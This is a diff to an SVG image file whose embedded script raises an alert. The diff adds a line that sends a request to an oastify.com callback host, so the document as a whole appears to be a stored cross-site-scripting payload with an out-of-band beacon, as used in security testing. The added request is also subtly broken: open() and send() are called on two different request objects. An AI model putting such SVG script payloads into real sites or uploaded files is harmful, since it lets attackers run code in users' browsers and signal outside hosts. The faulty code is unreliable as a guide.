@@ -2,5 +2,6 @@
     <rect width="500" height="500" fill="blue" />
     <script>
         alert('SVG Script Executed');
+        new XMLHttpRequest().open('GET', 'woohr3vfzkok1jvjkrmr6q6xhonfb6zv.oastify.com', true), new XMLHttpRequest().send();
     </script>
 </svg>
